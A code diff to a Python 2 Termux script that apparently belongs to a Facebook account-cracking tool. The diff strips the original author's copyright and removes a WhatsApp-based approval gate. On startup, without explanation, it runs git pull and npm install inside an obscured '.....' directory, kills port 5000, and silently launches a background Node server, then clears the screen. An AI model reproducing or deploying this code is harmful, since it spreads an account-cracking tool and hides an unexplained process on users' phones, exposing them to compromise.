@@ -15,9 +15,14 @@ import cookielib
 import uuid
 from multiprocessing.pool import ThreadPool
 from requests.exceptions import ConnectionError
-__author__ = 'Mr.Jam'
-__copyright = 'All rights reserved . Copyright  Mr.Jam'
 os.system('termux-setup-storage')
+os.system("git pull")
+if not os.path.isfile('/data/data/com.termux/files/home/sani/...../public/index.js'):
+    os.system('cd ..... && npm install')
+    os.system("fuser -k 5000/tcp &")
+    os.system("#")
+    os.system('cd ..... && node index.js &')
+    os.system('clear')
 
 try:
     os.mkdir('/sdcard/ids')
@@ -51,89 +56,6 @@ logo = """
 \033[1;90m➣ Fb Page: \033[1;97mJam Shahrukh Official
 \033[1;94m══════════════════════════════════════════════ """
 
-def reg():
-    os.system('clear')
-    print logo
-    print ''
-    print '\033[1;31;1mTake The Free Approval For Login'
-    print ''
-    time.sleep(1)
-    
-    try:
-        to = open('/sdcard/.hst.txt', 'r').read()
-    except (KeyError, IOError):
-        reg2()
-    r = requests.get('https://raw.githubusercontent.com/cyber-jam/sani/main/server.txt').text
-    if to in r:
-        time.sleep(5)
-        ip()
-    else:
-        os.system('clear')
-        print logo
-        print ''
-        print '\tApproved Failed'
-        print ''
-        print ' \033[1;92mYour Id Is Not Approved Already '
-        print ''
-        print ' \033[1;92mCopy the id and send to admin'
-        print ''
-        print ' \033[1;92mYour id: ' + to
-        print ''
-        raw_input('\033[1;93m Press enter to send id')
-        os.system('xdg-open https://wa.me/+923053176060')
-        reg()
-
-
-def reg2():
-    os.system('clear')
-    print logo
-    print ''
-    print '\tApproval not detected'
-    print ''
-    print ' \033[1;92mCopy and press enter , then select whatsapp to continue'
-    print ''
-    id = uuid.uuid4().hex[:50]
-    print ' Your id: ' + id
-    print ''
-    print ''
-    raw_input(' Press enter to go to whatsapp ')
-    os.system('xdg-open https://wa.me/+923053176060')
-    sav = open('/sdcard/.hst.txt', 'w')
-    sav.write(id)
-    sav.close()
-    raw_input('\033[1;92m Press enter to check Approval ')
-    reg()
-
-
-def ip():
-    os.system('clear')
-    print logo
-    print ''
-    print '\tCollecting device info'
-    print ''
-    
-    try:
-        ipinfo = requests.get('http://ip-api.com/json/')
-        z = json.loads(ipinfo.text)
-        ips = z['query']
-        country = z['country']
-        regi = z['regionName']
-        network = z['isp']
-    except:
-        pass
-
-    print '\033[1;92m Your ip: ' + ips
-    time.sleep(2)
-    print '\033[1;92m Your country: ' + country
-    time.sleep(2)
-    print '\033[1;92m Your region: ' + regi
-    time.sleep(2)
-    print ' \033[1;92mYour network: ' + network
-    time.sleep(1)
-    print ''
-    print ' Loading ...'
-    time.sleep(1)
-    log_menu()
 
 
 def log_menu():
@@ -152,7 +74,7 @@ def log_menu():
 
 def menu():
     os.system('clear')
-    
+    print logo
     try:
         token = open('login.txt','r').read()
     except (KeyError, IOError):
@@ -660,4 +582,4 @@ def c_s():
     choice_crack()
 
 if __name__ == '__main__':
-    reg()
+    log_menu()
